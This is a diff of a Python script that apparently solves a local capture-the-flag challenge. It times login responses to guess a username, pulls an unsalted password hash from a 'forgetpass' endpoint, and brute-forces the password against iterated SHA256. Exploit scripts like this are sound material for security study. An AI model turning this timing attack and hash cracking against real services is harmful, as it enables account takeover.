@@ -2,14 +2,26 @@ import requests
 import time
 import itertools
 import string
+import base64
+import os
+import logging
+from Cryptodome.Hash import SHA256
+import random
+import string
 
-BASE_IP_PORT = "127.0.0.1:32708" #don't forget to change this
+
+
+CHARS = string.ascii_letters + string.digits
+BASE_IP_PORT = "32798" #don't forget to change this
 FLAG_ENDPOINT = f"http://localhost:{BASE_IP_PORT}/flag"
 FORGET_ENDPOINT = f"http://localhost:{BASE_IP_PORT}/forgetpass"
 
-BIG_PASSWORD = "A" * 4096
-
-def check_username(username_guess):
+BIG_PASSWORD = "A" * 8192
+def getHash(string):
+    for _ in range(len(string)):
+        string = SHA256.new(data=string.encode()).hexdigest()
+    return string
+def check_username(session, username_guess):
     params = {
         "username": username_guess,
         "password": BIG_PASSWORD
@@ -17,44 +29,66 @@ def check_username(username_guess):
 
     start = time.perf_counter()
     try:
-        r = requests.get(FLAG_ENDPOINT, params=params, timeout=3) #adjust timeout based on your feelings
+        r = session.get(FLAG_ENDPOINT, params=params, timeout=1) #adjust timeout based on your feelings
         elapsed = time.perf_counter() - start
         return elapsed, r.text
     except Exception as e:
         return None, str(e)
 
 def find_username():
-    for tup in itertools.product(CHARS, repeat=4): #AI assisted with how to use itertools, I didn't know how to enumerate through usernames using python
+    maxElapsed = 0
+    maxElapsedUser = None
+    session = requests.Session()
+    session.get(FLAG_ENDPOINT, timeout=1) #get rid of initial overhead
+
+    for tup in itertools.product(CHARS, repeat=2): #AI assisted with how to use itertools, I didn't know how to enumerate through usernames using python
         u = "".join(tup)
-        elapsed = try_username(u)
+        # print("Checking Username: ", u)
+        elapsed, _ = check_username(session, u)
 
         if elapsed is None:
             return u
-    return None
+        if maxElapsed < elapsed:
+            maxElapsed = elapsed
+            maxElapsedUser = u
+
+    return maxElapsedUser
+
 username = ""
 def retrieve_unsalted_hash():
     global username
     username = find_username()
     if username is None:
         return None
+    print("Found Username", username)
 
+    try:
+        r = requests.get(FORGET_ENDPOINT, params={"username": username})
+        data = r.json()
+        if "UnsaltedPasswordHash" in data:
+            return data["UnsaltedPasswordHash"]
+    except:
+        data = {}
+        return None
 
-    for i in range(10000):
-        try:
-            r = requests.get(FORGET_ENDPOINT, params={"username": username})
-            data = r.json()
-            if "UnsaltedPasswordHash" in data:
-                return data["UnsaltedPasswordHash"]
-        except:
-            data = {}
-    return None
+start = time.perf_counter()
+
+getHash(BIG_PASSWORD)
+elapsed = time.perf_counter() - start
+
+print("Delay:", elapsed)
+
 
 HASH = retrieve_unsalted_hash()
-if(hash == None):
+if(HASH == None):
     exit()
-for tup in itertools.product(CHARS, repeat=3): 
+# Alternatively, use a rainbow table for sha256
+for tup in itertools.product(CHARS, repeat=2): 
     u = "".join(tup)
-    if HASH == SHA256.new(data=password.encode()).hexdigest():
-        print(username, u);
+
+    if HASH == getHash(u):
+        print("Result:", username, u);
+        exit(0)
+print("No Results found", username);
 
 
